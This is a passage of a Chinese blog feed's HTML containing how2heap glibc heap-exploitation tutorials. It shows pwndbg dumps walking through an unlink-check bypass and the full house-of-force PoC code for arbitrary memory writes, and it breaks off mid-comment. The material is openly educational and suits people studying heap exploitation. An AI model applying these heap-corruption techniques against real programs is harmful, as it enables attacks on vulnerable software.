class="meta">#p-----------&gt;:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000555555756008</span><span class="number">0x0000555555756010</span></span><br><span class="line">    #fake_chunk_fd#fake_chunk_bk</span><br><span class="line">......</span><br><span class="line"><span class="comment">//chunk1_hdr-&gt;:0x00000000000004200x0000000000000430 #chunk1</span></span><br><span class="line">  #chunk1_hdr[<span class="number">0</span>] = malloc_size  #chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020551</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>现在开始进行 unlink，宏代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))   【检查<span class="number">1</span>】</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))【检查<span class="number">2</span>】</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//省略有关于largebin的代码......</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再回顾一下 unlink 的检查机制，首先先看【检查 1】：</p><ul><li>chunksize(P)==0x0</li><li>prev_size (next_chunk(P))==prev_size (P)==0x0</li></ul><p>所以 chunksize(P)==prev_size (next_chunk(P))可以绕过【检查 1】<br>然后：<br>FD = P-&gt;fd==fake_chunk_fd==0x0000555555756008<br>BK = P-&gt;bk==fake_chunk_bk==0x0000555555756010</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk0_ptr</span><br><span class="line"><span class="number">0x555555756020</span> &lt;chunk0_ptr&gt;:<span class="number">0x0000555555757260</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">6</span>gx &amp;chunk1_ptr</span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000555555757690</span><span class="number">0x0000555555757680</span></span><br><span class="line">    #&amp;chunk1_hdr==<span class="number">0x555555757680</span></span><br><span class="line">                     #<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x0000555555756010</span></span><br><span class="line"><span class="number">0x555555756010</span> &lt;<span class="built_in">stdout</span>@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>&gt;:<span class="number">0x00007ffff7dce760</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756020</span> &lt;chunk0_ptr&gt;:<span class="number">0x0000555555757260</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x555555756008</span></span><br><span class="line"><span class="number">0x555555756008</span>:<span class="number">0x0000555555756008</span><span class="number">0x00007ffff7dce760</span></span><br><span class="line"><span class="number">0x555555756018</span> &lt;completed<span class="number">.7698</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757260</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555756078</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>再来看【检查 2】：__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)：</p><ul><li>FD-&gt;bk==fake_chunk_fd-&gt;bk==0x0000555555757260==P</li><li>BK-&gt;fd== fake_chunk_bk-&gt;fd==0x0000555555757260==P</li></ul><p>因此可以绕过【检查 2】，绕过这两个检查之后开始对堆块进行 unlink：<br>首先执行 FD-&gt;bk = BK;这个式子等价于：0x0000555555756008-&gt;bk=0x0000555555756010，执行完毕后内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x555555756008</span></span><br><span class="line"><span class="number">0x555555756008</span>:<span class="number">0x0000555555756008</span><span class="number">0x00007ffff7dce760</span></span><br><span class="line"><span class="number">0x555555756018</span> &lt;completed<span class="number">.7698</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000555555756010</span></span><br><span class="line">       #<span class="number">0x0000555555757260</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555756078</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后执行 BK-&gt;fd = FD;等价于：0x0000555555756010-&gt;fd=0x0000555555756008</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x0000555555756010</span></span><br><span class="line"><span class="number">0x555555756010</span> &lt;<span class="built_in">stdout</span>@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>&gt;:<span class="number">0x00007ffff7dce760</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756020</span> &lt;chunk0_ptr&gt;:<span class="number">0x0000555555756008</span><span class="number">0x0000000000000000</span></span><br><span class="line">       #<span class="number">0x0000555555756010</span></span><br><span class="line"><span class="number">0x555555756030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><strong>Warning：现在 chunk0_ptr 的指针已经被篡改，这个指针已经指向了程序的 data 段。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//判断nextchunk是否是top_chunk，这里很明显是</span></span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//进入else分支,top_chunk向低地址吞并</span></span><br><span class="line">  size += nextsize; <span class="comment">//size==size+nextsize==0x420+0x20550==0x20970</span></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span> #chunk0</span><br><span class="line"><span class="meta">#p-----------&gt;:0x00000000000000000x0000000000020da1 #top_chunk</span></span><br><span class="line">#set_head(p, size | PREV_INUSE)</span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000555555756008</span><span class="number">0x0000555555756010</span></span><br><span class="line">    #fake_chunk_fd#fake_chunk_bk</span><br><span class="line">......</span><br><span class="line"><span class="comment">//chunk1_hdr-&gt;:0x00000000000004200x0000000000000430 #chunk1（free）</span></span><br><span class="line">  #chunk1_hdr[<span class="number">0</span>] = malloc_size  #chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020551</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>注意，现在 top_chunk 已经向前移动到我们伪造的 p 位置，但是 chunk0 仍然处于 malloc 状态，因此现在我们可以任意的修改 top_chunk 的值，在小于 glibc 2.29 的版本中可以使用上一小节的 house of force。<br>既然 chunk0_ptr 已经被篡改，所指向的地方已经可控，我们来看一下最终的效果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string; #向chunk0_ptr[<span class="number">3</span>]处写入<span class="string">&quot;Hello!~&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x0000555555756010</span></span><br><span class="line"><span class="number">0x555555756010</span> &lt;<span class="built_in">stdout</span>@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>&gt;:<span class="number">0x00007ffff7dce760</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756020</span> &lt;chunk0_ptr&gt;:<span class="number">0x00007fffffffdda0</span><span class="number">0x0000000000000000</span></span><br><span class="line">       #<span class="number">0x0000555555756008</span></span><br><span class="line"><span class="number">0x555555756030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>上述步骤修改了 chunk0_ptr 的指针为栈上的地址（这个地址是我们想要控制的地址）：0x00007fffffffdda0，然后向 xchunk0_ptr 中写入了”Hello!~”字符串：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620694437429-b6ab42db-33a9-4743-83a4-0ad83366fbfb.png#clientId=u7a41f469-4a5b-4&from=drop&id=ued353420&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-11%2008.53.51.png&originHeight=1318&originWidth=2748&originalType=binary&size=236737&status=done&style=none&taskId=ufa44ab37-e5f8-449d-b0b3-c2b2e8ab6c8" alt="截屏2021-05-11 08.53.51.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620694574445-9df169ee-05ff-4c8a-9ce7-6414c3564100.png#clientId=u7a41f469-4a5b-4&from=drop&id=ufda3dd66&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-11%2008.56.10.png&originHeight=1324&originWidth=2746&originalType=binary&size=233893&status=done&style=none&taskId=ud90b33e4-31ad-40b4-ba66-f874e043c93" alt="截屏2021-05-11 08.56.10.png"></p><h1 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h1><p>接下来我们总结一下这个 POC 以便于在 CTF 时可以直接拿来使用，但还是要具体情况具体分析：<br>1、 首先我们创建了两个堆块大小超过放入 tcachebin 的堆块：chunk0、chunk1<br>chunk0 指针存放在地址 0x555555756020（data 段）<br>chunk0 指针指向 chunk0 的 user_data：0x0000555555757260<br>chunk1 指针存放在地址 0x7fffffffdd90(stack 段)<br>chunk1 指针指向 chunk1 的 user_data：0x0000555555757690<br>2、然后我们在 chunk0 的起始地址+0x20 处（也就是 fd_nextsize 和 bk_nextsize 所在的地方）伪造两个指针，当然这个指针的地址也是有要求的：相差 0x8。（POC 中这两个指针分别为 0x555555756008 和 0x555555756010）。注意：这两个指针可不是随便伪造的，它们可不是乱来的：只需在地址 0x555555756008+0x18 处写入值 chunk0 的 user_data 地址（这个我们要伪造的堆块的起始地址）0x555555757260 即可。</p><blockquote><p>这里其实反着来更好，先找要写入的地方，再倒推两个伪造的指针地址。</p></blockquote><p>3、然后通过堆溢出将 chunk1 的 mchunk_prev_size 和 mchunk_size 分别设置为 chunk0_mchunk_size-0x11 和 chunk1_mchunk_size-0x1。<br>4、之后我们 free 掉 chunk1，free 时会发生 unlink 和向后合并导致 top_chunk 向前吞并，现在 chunk0 已经可以控制到 top_chunk；另外，free 此堆块后现在从地址 0x555555756008 开始的内容已经可以被控制（注意：chunk0 指针存放在地址 0x555555756020，也就是说 chunk0_ptr 指针可以被控制），我们将 chunk0_ptr 指针的指向修改为想要控制的地方，修改后即可控制那片内存。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(8)-house of force</title>
    <link href="https://cyberangel.cn/2021/05/10/how2heap(8)-house%20of%20force/"/>
    <id>https://cyberangel.cn/2021/05/10/how2heap(8)-house%20of%20force/</id>
    <published>2021-05-10T02:02:10.000Z</published>
    <updated>2021-07-04T09:57:12.016Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>house of force 的原理十分简单，主要是控制 top_chunk 的 mchunk_size 为-1，这时可以 malloc 一个非常大的堆块从而达到任意控制内存的目的。具体原理可以见之前的内容：</p><h1 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h1><p>glibc 版本小于 2.29</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-内容"><a href="#POC-内容" class="headerlink" title="POC 内容"></a>POC 内容</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum</span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line"><span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// some further discussion:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;and we \nwant to set this result to the address of 